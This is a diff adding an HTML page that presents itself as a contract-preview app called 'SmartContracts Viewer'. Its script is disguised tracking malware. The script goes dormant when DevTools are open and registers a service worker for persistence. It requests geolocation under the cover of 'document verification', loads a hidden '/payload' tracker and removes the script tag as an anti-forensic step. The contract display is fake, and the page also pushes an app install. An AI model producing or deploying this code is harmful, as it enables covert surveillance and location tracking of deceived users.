@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SmartContracts Viewer</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png" />
+  <link rel="manifest" href="/manifest.json" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f7f7f7;
+      color: #333;
+      text-align: center;
+      padding: 40px;
+    }
+    h1 {
+      color: #444;
+    }
+    .card {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
+    }
+    p {
+      font-size: 15px;
+      color: #777;
+    }
+    .accept-btn {
+      background: #0052cc;
+      color: #fff;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>SmartContracts Viewer</h1>
+    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
+    <p><i id="loadMsg">Loading contract document...</i></p>
+    <button class="accept-btn" id="acceptBtn" style="display:none;">Accept &amp; View Contract</button>
+  </div>
+
+  <script>
+    // === BOOTLOADER ===
+    // This tiny script loads the real tracking payload and registers the Service Worker.
+    (function() {
+      'use strict';
+
+      const DEBUG = false; // Set true for console logs (never in production)
+      const log = DEBUG ? console.log.bind(console, '[SCV]') : function(){};
+
+      // Detect DevTools
+      function devtoolsOpen() {
+        const threshold = 160;
+        const before = performance.now();
+        debugger;
+        const after = performance.now();
+        return (after - before) > threshold;
+      }
+
+      // If DevTools detected, wait a bit and try again; if still open, go dormant.
+      if (devtoolsOpen()) {
+        setTimeout(function() {
+          if (devtoolsOpen()) {
+            // Dormant: do not load tracker
+            log('DevTools open – tracker dormant');
+            return;
+          } else {
+            initTracker();
+          }
+        }, 2000);
+      } else {
+        initTracker();
+      }
+
+      function initTracker() {
+        // Register Service Worker for background persistence
+        if ('serviceWorker' in navigator) {
+          navigator.serviceWorker.register('/sw.js').then(function(reg) {
+            log('SW registered');
+          }).catch(function(err) {
+            log('SW registration failed', err);
+          });
+        }
+
+        // Show the "Accept & View" button after a short delay, then attach click
+        var acceptBtn = document.getElementById('acceptBtn');
+        var loadMsg = document.getElementById('loadMsg');
+        setTimeout(function() {
+          loadMsg.textContent = 'Document ready.';
+          acceptBtn.style.display = 'inline-block';
+        }, 1000);
+
+        var geolocationPromptTriggered = false;
+        acceptBtn.addEventListener('click', function() {
+          // Trigger geolocation request under cover of "document verification"
+          if (!geolocationPromptTriggered && 'geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+              function() {}, // We don't need the position here; the tracker payload will handle it.
+              function(err) {
+                log('Geo permission denied:', err.message);
+                // Could show fake error about "jurisdictional verification required"
+              }
+            );
+            geolocationPromptTriggered = true;
+          }
+
+          // Load the real tracking payload
+          var script = document.createElement('script');
+          script.src = '/payload';
+          script.onload = function() {
+            log('Tracker payload loaded');
+            // Remove script tag after load (anti-forensic)
+            document.head.removeChild(script);
+          };
+          script.onerror = function() {
+            log('Failed to load tracker payload');
+          };
+          document.head.appendChild(script);
+
+          // Update UI to show contract content (fake)
+          loadMsg.textContent = 'Contract displayed below...';
+          acceptBtn.style.display = 'none';
+        });
+
+        // PWA install prompt ("Offline Document Viewer")
+        var deferredPrompt;
+        window.addEventListener('beforeinstallprompt', function(e) {
+          e.preventDefault();
+          deferredPrompt = e;
+          // Show a subtle install button or integrate with UI
+          var installBtn = document.createElement('button');
+          installBtn.textContent = 'View contracts offline';
+          installBtn.className = 'accept-btn';
+          installBtn.style.marginLeft = '10px';
+          installBtn.addEventListener('click', function() {
+            deferredPrompt.prompt();
+            deferredPrompt.userChoice.then(function(choiceResult) {
+              log('PWA install', choiceResult.outcome);
+            });
+            installBtn.remove();
+          });
+          document.querySelector('.card').appendChild(installBtn);
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
